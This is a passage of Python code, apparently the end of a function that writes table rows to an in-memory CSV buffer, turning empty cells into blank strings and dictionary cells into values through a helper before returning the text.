    for row in rows:
        writer.writerow(["" if cell is None else _cell_value(cell) if isinstance(cell, dict) else cell
                         for cell in row])
    return out.getvalue()
